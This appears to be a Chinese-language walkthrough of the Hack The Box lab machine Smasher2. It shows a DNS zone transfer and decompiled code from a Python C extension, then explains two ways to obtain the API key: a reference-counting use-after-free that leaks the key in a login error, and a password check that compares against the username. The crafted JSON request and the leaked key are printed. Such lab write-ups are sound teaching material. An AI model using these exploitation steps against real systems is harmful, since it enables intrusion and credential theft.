<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dig axfr @10.10.10.135 smasher2.htb</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.135 smasher2.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">smasher2.htb.           604800  IN      NS      smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      A       127.0.0.1</span><br><span class="line">smasher2.htb.           604800  IN      AAAA    ::1</span><br><span class="line">smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 265 msec</span><br><span class="line">;; SERVER: 10.10.10.135<span class="comment">#53(10.10.10.135)</span></span><br><span class="line">;; WHEN: 四 12月 26 21:25:05 EST 2019</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 242)</span><br></pre></td></tr></table></figure>

<p>将下面ip地址和3个域名添加到hosts文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.135 wonderfulsessionmanager.smasher2.htb smasher2.htb root.smasher2.htb</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb4.jpg"></p>
<p>访问<span class="exturl" data-url="aHR0cDovL3Jvb3Quc21hc2hlcjIuaHRiL2JhY2t1cC8lRTUlOEYlOTElRTclOEUlQjAlRTglQkYlOTglRTYlOTglQUYlRTUlOEUlOUYlRTYlOUQlQTUlRTclOUElODQlRTklQTElQjUlRTklOUQlQTIlRTUlQTYlODIlRTQlQjglOEIlRTUlOUIlQkUlRTYlODklODAlRTclQTQlQkE=">http://root.smasher2.htb/backup/发现还是原来的页面如下图所示<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb5.jpg"></p>
<p>访问<span class="exturl" data-url="aHR0cDovL3dvbmRlcmZ1bHNlc3Npb25tYW5hZ2VyLnNtYXNoZXIyLmh0Yi8lRTUlQTYlODIlRTQlQjglOEI=">http://wonderfulsessionmanager.smasher2.htb/如下<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb6.jpg"></p>
<p>点击try login登录</p>
<ul>
<li>查看之前下载的python文件的源码</li>
</ul>
<p>从/backup提取的两个文件构成了Python Flask Web应用程序。 主要代码是auth.py。 第二行是import ses，像其他Python模块一样加载.so共享库。</p>
<p>ses库用于在应用程序启动时创建具有登录凭据的对象。 不幸的是，用户名和密码已从以下备用代码中删除：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def safe_init_manager(id):</span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">if</span> id <span class="keyword">in</span> Managers:</span><br><span class="line">        del Managers[id]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">            Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.join(login)))&#125;)</span><br><span class="line">    lock.release()</span><br></pre></td></tr></table></figure>

<p>Flask应用程序具有以@app.before_request修饰的before_request函数，因此它将在将每个请求传递给路由处理代码之前与每个请求一起运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@app.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    <span class="keyword">if</span> request.path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> not session.has_key(<span class="string">&quot;id&quot;</span>):</span><br><span class="line">            k = get_secure_key()</span><br><span class="line">            safe_init_manager(k)</span><br><span class="line">            session[<span class="string">&quot;id&quot;</span>] = k</span><br><span class="line">        <span class="keyword">elif</span> session.has_key(<span class="string">&quot;id&quot;</span>) and not safe_have_manager(session[<span class="string">&quot;id&quot;</span>]):</span><br><span class="line">            del session[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">            <span class="built_in">return</span> redirect(<span class="string">&quot;/&quot;</span>, 302)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.has_key(<span class="string">&quot;id&quot;</span>) and safe_have_manager(session[<span class="string">&quot;id&quot;</span>]):</span><br><span class="line">            pass</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> redirect(<span class="string">&quot;/&quot;</span>, 302)</span><br></pre></td></tr></table></figure>
<p>此代码确保为每次访问创建一个会话，或者将其重定向到/。<br>该应用程序有五个路径，/assets/<span class="exturl" data-url="cGF0aDpmaWxlbmFtZQ==">path:filename<i class="fa fa-external-link-alt"></i></span>, /, /login, /auth, /api。 最后两个最有趣。</p>
<h4 id="Shell-as-dzonerzy"><a href="#Shell-as-dzonerzy" class="headerlink" title="Shell as dzonerzy"></a>Shell as dzonerzy</h4><ul>
<li>获取API密钥</li>
</ul>
<p>尝试登录该页面时，有一个POST到/auth。 看一下这段代码，就会发现以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/auth&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def login():</span><br><span class="line">    ret = &#123;<span class="string">&quot;authenticated&quot;</span>: None, <span class="string">&quot;result&quot;</span>: None&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">    data = request.get_json(silent=True)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        try:</span><br><span class="line">            tmp_login = dict(data[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        tmp_user_login = None</span><br><span class="line">        try:</span><br><span class="line">            is_logged = manager.check_login(data)</span><br><span class="line">            secret_token_info = [<span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>, manager.secret_key, int(time.time())]</span><br><span class="line">            try:</span><br><span class="line">                tmp_user_login = &#123;<span class="string">&quot;username&quot;</span>: tmp_login[<span class="string">&quot;username&quot;</span>], <span class="string">&quot;password&quot;</span>: tmp_login[<span class="string">&quot;password&quot;</span>]&#125;</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">if</span> not is_logged[0]:</span><br><span class="line">                ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> tmp_user_login is not None:</span><br><span class="line">                    log_creds(request.remote_addr, tmp_user_login)</span><br><span class="line">                ret[<span class="string">&quot;authenticated&quot;</span>] = True</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = &#123;<span class="string">&quot;endpoint&quot;</span>: secret_token_info[0], <span class="string">&quot;key&quot;</span>: secret_token_info[1], <span class="string">&quot;creation_date&quot;</span>: secret_token_info[2]&#125;</span><br><span class="line">        except TypeError as e:</span><br><span class="line">            ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">            ret[<span class="string">&quot;result&quot;</span>] = str(e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">        ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate missing parameters.&quot;</span></span><br><span class="line">    <span class="built_in">return</span> jsonify(ret)</span><br></pre></td></tr></table></figure>

<p>现在是需要了解依赖于ses.so中的模块的manager对象的地方。 下图是上面is_logged = manager.check_login(data)调用的can_login函数在Ida Pro中的样子：</p>
<p><img src="https://0xdf.gitlab.io/img/1570903084609.png"></p>
<p>国外大佬的图分析的很清楚，再次膜拜</p>
<p>关于Python代码的另一条注释-api密钥（存储为manager.secret_key）在此处设置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.join(login)))&#125;)</span><br></pre></td></tr></table></figure>

<p>craft_secure_token()，它只是获取输入并对其进行hash处理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def craft_secure_token(content):</span><br><span class="line">    h = hmac.new(<span class="string">&quot;HMACSecureKey123!&quot;</span>, base64.b64encode(content).encode(), hashlib.sha256)</span><br><span class="line">    <span class="built_in">return</span> h.hexdigest()</span><br></pre></td></tr></table></figure>
<p>这意味着只要用户名和密码不变，API密钥也不会改变。</p>
<h3 id="方法1：利用引用计数"><a href="#方法1：利用引用计数" class="headerlink" title="方法1：利用引用计数"></a>方法1：利用引用计数</h3><p>这是预期的方法，但是很难发现.</p>
<p>Python对象是在堆上分配的，并且保留引用计数以监视它们是否在使用中，并且当引用计数达到0时，垃圾收集器将释放空间。 在编写Python代码时，将为您进行管理。 但是一旦开始编写C扩展名（编译为.so文件），就必须<span class="exturl" data-url="aHR0cDovL2VkY2pvbmVzLnRyaXBvZC5jb20vcmVmY291bnQuaHRtbA==">manage these references yourself<i class="fa fa-external-link-alt"></i></span>。 有<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy44L2MtYXBpL3JlZmNvdW50aW5nLmh0bWw=">series of C macros<i class="fa fa-external-link-alt"></i></span>将有助于实现这一目标。 可以通过在CPython源代码中查看<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvbWFzdGVyL0luY2x1ZGUvb2JqZWN0Lmg=">object.c<i class="fa fa-external-link-alt"></i></span>来查看Python对象。</p>
<p>首先，我将看到对象结构使得任何对象中的第一个值都是ob_refcnt，即引用计数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typedef struct _object &#123;</span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    struct _typeobject *ob_type;</span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure>

<p>我还可以看到PyINCREF(op)宏基本上只是对_PyINCREF的调用，该调用基本上只是向该引用计数器值添加一个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">static inline void _Py_INCREF(PyObject *op)</span><br><span class="line">&#123;</span><br><span class="line">    _Py_INC_REFTOTAL;</span><br><span class="line">    op-&gt;ob_refcnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define Py_INCREF(op) _Py_INCREF(_PyObject_CAST(op))</span></span><br></pre></td></tr></table></figure>

<p>类似地，如果查看Py_DECREF，则相同，除了代码运行不仅会减少引用计数器，而且如果该计数器为0，它将在对象上调用_Py_Dealloc：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">static inline void _Py_DECREF(const char *filename, int lineno,</span><br><span class="line">                              PyObject *op)</span><br><span class="line">&#123;</span><br><span class="line">    (void)filename; /* may be unused, shut up -Wunused-parameter */</span><br><span class="line">    (void)lineno; /* may be unused, shut up -Wunused-parameter */</span><br><span class="line">    _Py_DEC_REFTOTAL;</span><br><span class="line">    <span class="keyword">if</span> (--op-&gt;ob_refcnt != 0) &#123;</span><br><span class="line"><span class="comment">#ifdef Py_REF_DEBUG</span></span><br><span class="line">        <span class="keyword">if</span> (op-&gt;ob_refcnt &lt; 0) &#123;</span><br><span class="line">            _Py_NegativeRefcount(filename, lineno, op);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _Py_Dealloc(op);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define Py_DECREF(op) _Py_DECREF(__FILE__, __LINE__, _PyObject_CAST(op))</span></span><br></pre></td></tr></table></figure>

<p>根据文档，_Py_Dealloc没有在此定义，因为它仅在解释器代码中使用。<br>我将在Ghidra中打开该模块，然后看一下反汇编。 当我开始学习具有这些知识的代码时，便开始看到我认为这些宏的实例。 例如，在SessionManager_check_login中，在第44行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">post_has_data = dict_contains(post_data,&amp;data);</span><br><span class="line"><span class="keyword">if</span> ((char)post_has_data != <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">  *post_data = *post_data + -1;</span><br><span class="line">  <span class="keyword">if</span> (*post_data == 0) &#123;</span><br><span class="line">    (**(code **)(post_data[1] + 0x30))(post_data);</span><br><span class="line">  &#125;</span><br><span class="line">  plVar2 = (long *)ErrorMsg(PyExc_TypeError,<span class="string">&quot;Missing data parameter&quot;</span>,parameter,uVar3,in_R8B,in_R9B</span><br><span class="line">                            ,(char)parameter);</span><br><span class="line">  goto LAB_0010250e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它调用dict_contains来查看传递给它的（我的POST）是否是包含键“data”的字典。 如果返回的结果不为true（’\ x01’），则它将递减参考计数器，然后检查它是否现在为0。如果是，则其自身将调用post_data [1] + 0x30。</p>
<p>由于我知道post_data是一个字典对象，因此我可以查看dictobject.c的Python源代码，以了解结构的定义位置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PyTypeObject PyDictIterItem_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)</span><br><span class="line">    <span class="string">&quot;dictionary-itemiterator&quot;</span>,                  /* tp_name */</span><br><span class="line">    sizeof(dictiterobject),                     /* tp_basicsize */</span><br><span class="line">    0,                                          /* tp_itemsize */</span><br><span class="line">    /* methods */</span><br><span class="line">    (destructor)dictiter_dealloc,               /* tp_dealloc */</span><br><span class="line">    0,                                          /* tp_print */</span><br><span class="line">    0,                                          /* tp_getattr */</span><br><span class="line">    0,                                          /* tp_setattr */</span><br><span class="line">    0,                                          /* tp_compare */</span><br><span class="line">    0,                                          /* tp_repr */</span><br><span class="line">    0,                                          /* tp_as_number */</span><br><span class="line">    0,                                          /* tp_as_sequence */</span><br><span class="line">    0,                                          /* tp_as_mapping */</span><br><span class="line">    0,                                          /* tp_hash */</span><br><span class="line">    0,                                          /* tp_call */</span><br><span class="line">    0,                                          /* tp_str */</span><br><span class="line">    PyObject_GenericGetAttr,                    /* tp_getattro */</span><br><span class="line">    0,                                          /* tp_setattro */</span><br><span class="line">    0,                                          /* tp_as_buffer */</span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,/* tp_flags */</span><br><span class="line">    0,                                          /* tp_doc */</span><br><span class="line">    (traverseproc)dictiter_traverse,            /* tp_traverse */</span><br><span class="line">    0,                                          /* tp_clear */</span><br><span class="line">    0,                                          /* tp_richcompare */</span><br><span class="line">    0,                                          /* tp_weaklistoffset */</span><br><span class="line">    PyObject_SelfIter,                          /* tp_iter */</span><br><span class="line">    (iternextfunc)dictiter_iternextitem,        /* tp_iternext */</span><br><span class="line">    dictiter_methods,                           /* tp_methods */</span><br><span class="line">    0,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>知道PyVarObject_HEAD_INIT扩展为1，类型，大小，并假设每个单词为8字节，则0x30字节为（（析构函数）dictiter_dealloc）。<br>因此，回过头来，发现了Py_DECREF宏的外观。<br>同样，我在代码中看到的地方如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*data_object = *data_object + 1;</span><br></pre></td></tr></table></figure>

<p>这是Py_INCREF宏扩展的。<br>在此基础上，我将回到手头的代码。 错误在于如何跟踪从请求中读取的Python对象数据的引用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data = request.get_json(silent=True)</span><br></pre></td></tr></table></figure>
<p>稍后将其传递到manager.check_login中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">is_logged = manager.check_login(data)</span><br></pre></td></tr></table></figure>

<p>结果is_logged包含is_logged[1]中原始提交的json，该错误消息中引用了json：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>如果登录失败，则会显示POSTED JSON来代替前一个％s：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;authenticated&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span>: <span class="string">&quot;Cannot authenticate with data: &#123;u&#x27;username&#x27;: u&#x27;0xdf&#x27;, u&#x27;password&#x27;: u&#x27;password&#x27;&#125; - Try again!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在C中，我可以在变量声明之后的第二行看到创建新列表对象的地方：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">return_list_object = (long *)PyList_New(2);</span><br></pre></td></tr></table></figure>
<p>再向下一点，在检查关键数据是否在发布的JSON/字典中之后，它将数据对象读入一个对象，我将其命名为dataobject：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data_object = (long *)get_dict_key(post_data,&amp;data);</span><br></pre></td></tr></table></figure>

<p>接下来是一个阻止程序，用于检查用户是否被阻止并进行处理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user_is_blocked = is_blocked(user_login);</span><br><span class="line"><span class="keyword">if</span> ((char)user_is_blocked == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">  user_is_blocked = can_login(user_login);</span><br><span class="line">  <span class="keyword">if</span> ((char)user_is_blocked != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    set_unblocked(user_login);</span><br><span class="line">    set_login_count(user_login,0);</span><br><span class="line">  &#125;</span><br><span class="line">  local_50 = (long *)PyBool_FromLong(0);</span><br><span class="line">  *local_50 = *local_50 + 1;</span><br><span class="line">  *(long **)return_list_object[3] = local_50;</span><br><span class="line">  *data_object = *data_object + 1;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我将注意到，将创建一个布尔False（然后将引用计数器增加Py_INCREF），并将其存储在列表对象的第三个单词中。 然后，将data_object传递给Py_INCREF，然后将其设置为8个字节到同一第三个对象中。 因此，列表中的第三个对象必须是列表本身（第一个对象是引用计数）。 在此函数的最后，我看到这是返回的对象：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  *return_list_object = *return_list_object + 1;</span><br><span class="line">  plVar2 = return_list_object;</span><br><span class="line">LAB_0010250e:</span><br><span class="line">  <span class="keyword">if</span> (local_20 != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> plVar2;</span><br></pre></td></tr></table></figure>

<p>列表对象上的引用计数增加，然后将其设置为plVar2并返回。<br>如果未阻止用户，则可以看到类似的模式。 将检查登录计数，该计数小于10，它将从POSTed JSON和内部存储中加载用户名和密码。 然后，我将在此处显示三种可能的路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  __s2 = (char *)get_internal_usr(user_login);</span><br><span class="line">  success = strcmp(username_string,__s2);</span><br><span class="line">  <span class="keyword">if</span> (success == 0) &#123;</span><br><span class="line">    __s2 = (char *)get_internal_pwd(user_login);</span><br><span class="line">    success = strcmp(password_string,__s2);</span><br><span class="line">    <span class="keyword">if</span> (success == 0) &#123;</span><br><span class="line">      puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">      return_value = PyBool_FromLong(1);</span><br><span class="line">      *puVar1 = return_value;</span><br><span class="line">      *data_object = *data_object + 1;</span><br><span class="line">      *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">      goto LAB_001024c5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">  return_value = PyBool_FromLong(0);</span><br><span class="line">  *puVar1 = return_value;</span><br><span class="line">  *data_object = *data_object + 1;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  set_blocked(user_login);</span><br><span class="line">  local_48 = (long *)PyBool_FromLong(1);</span><br><span class="line">  *local_48 = *local_48 + 1;</span><br><span class="line">  puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">  return_value = PyBool_FromLong(0);</span><br><span class="line">  *puVar1 = return_value;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个是用户名和密码是否匹配。 它在data_object上调用Py_INCREF，将其设置为列表中的8个字节，并将列表中的0个字节设置为True。<br>如果用户名或密码失败，则将其Py_INCREFs data_ojbect设置为列表中的第一项为False，将data_object上的名称为Py_INCREF，然后将data_object置于第二项。<br>第三个路径是登录计数不小于10。它将第一个列表项设置为False，将第二个列表项设置为data_object。<br>缺少了什么？ 它没有增加data_object的引用计数！ 下一个代码（所有路径都经过）是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LAB_001024c5:</span><br><span class="line">  *data_object = *data_object + -1;</span><br><span class="line">  <span class="keyword">if</span> (*data_object == 0) &#123;</span><br><span class="line">    (**(code **)(data_object[1] + 0x30))(data_object);</span><br><span class="line">  &#125;</span><br><span class="line">  *return_list_object = *return_list_object + 1;</span><br><span class="line">  plVar2 = return_list_object;</span><br></pre></td></tr></table></figure>

<p>这是data_object上的Py_DECREF。<br>这是什么意思？ 在此调用结束时，如果它是第11次失败的登录，则具有用户名和密码的data_object将被标记为不再引用，因此将打开以进行垃圾回收，即使当相同的内存将在错误消息中打印出来时， 代码重新回到Python中。<br>事实证明，在调用manager.check_login（data）之后，无论check_login的结果如何，它都会创建一个对象：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">is_logged = manager.check_login(data)</span><br><span class="line">secret_token_info = [<span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>, manager.secret_key, int(time.time())]</span><br></pre></td></tr></table></figure>

<p>几行后，识别出登录失败并构造了消息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> not is_logged[0]:</span><br><span class="line">    ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">    ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<ul>
<li><p>我发送10个失败的登录名。用户状态未设置为已阻止。</p>
</li>
<li><p>我发送了第11次登录尝试，但登录数据已修改，因此它包含与secret_token_info相同的结构，并带有两个字符串和一个int的列表，而不是该站点发送的是带有两个键的字典。</p>
</li>
<li><p>manager.check_login（）由于该块而将失败，并减少data_object上的引用计数，从而使垃圾收集器将堆上的该空间标记为已打开。</p>
</li>
<li><p>该程序在堆上为secret_token_info分配空间，secret_token_info是一个具有两个字符串和一个int的Python对象。由于data_object进行垃圾回收之前所在的空间仅为该大小，因此它将使用该空间。</p>
</li>
<li><p>发送错误消息时，由于出现垃圾回收错误，指向data_object的指针现在指向secret_token_info，而是显示该信息。</p>
</li>
</ul>
<p>Proxy通过Burp发送，并设置拦截。提交一个明显不正确的用户名和密码0xdf/0xdf：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb7.jpg"></p>
<p>再发送9次。现在，将其更改为数据为具有两个字符串和一个整数的数组。 它们的值是什么无关紧要。 使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;auth&quot;</span>,<span class="string">&quot;data&quot;</span>:[<span class="string">&quot;0xdf&quot;</span>, <span class="string">&quot;string&quot;</span>, 223]&#125;</span><br></pre></td></tr></table></figure>
<p>当我提交时，错误消息中包含泄漏的信息，包括API密钥及其使用方法：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb8.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;authenticated&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;result&quot;</span>:<span class="string">&quot;Cannot authenticate with data: [&#x27;/api/&lt;api_key&gt;/job&#x27;, &#x27;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&#x27;, 1577434053] - Too many tentatives, wait 2 minutes!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法2：利用用户名-密码"><a href="#方法2：利用用户名-密码" class="headerlink" title="方法2：利用用户名==密码"></a>方法2：利用用户名==密码</h3><p>在这里，我查看了检查用户名和密码的代码。 首先，此块加载输入的用户名和密码，然后调用get_internal_usr，并将输入的用户名与结果进行比较：</p>
<p><img src="https://0xdf.gitlab.io/img/1570906220495.png"></p>
<p>如果匹配，则在此处继续，在此调用get_internal_pwd并将用户输入的密码与结果进行比较：</p>
<p><img src="https://0xdf.gitlab.io/img/1570906095855.png"></p>
<p>如果此比较匹配，则返回True。<br>从启动代码中记住登录对象是一个包含两个项目的列表，可能是用户名和密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.join(login)))&#125;)</span><br></pre></td></tr></table></figure>

<p>深入研究get_internal_usr（在Ghidra中查找反编译的代码），看到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">undefined8 get_internal_usr(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (long *)PyObject_GetAttrString(param_1,<span class="string">&quot;user_login&quot;</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,0);</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + -1;         // Py_DECREF</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == 0) &#123;</span><br><span class="line">    (**(code **)(plVar1[1] + 0x30))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用PyObject_GetAttrString来获取user_login对象，该对象是上面带有用户名和密码的列表。 然后在下一行检索列表中的第一项，将其作为字符串处理，并在调用Py_DECREF之后返回。 这就是所期望的。<br>现在，看看get_internal_pwd：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">undefined8 get_internal_pwd(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (long *)PyObject_GetAttrString(param_1,<span class="string">&quot;user_login&quot;</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,0);  // This should be 1, not 0</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + -1;</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == 0) &#123;</span><br><span class="line">    (**(code **)(plVar1[1] + 0x30))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行相同的操作，包括获取列表中的第一项，而不是第二项。 这意味着实际上是根据存储的用户名检查密码的！<br>知道了这一点，我花了几分钟就猜出了Administrator：Administrator的凭据。 这样做时，它将返回API密钥和端点信息：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb9.jpg"></p>
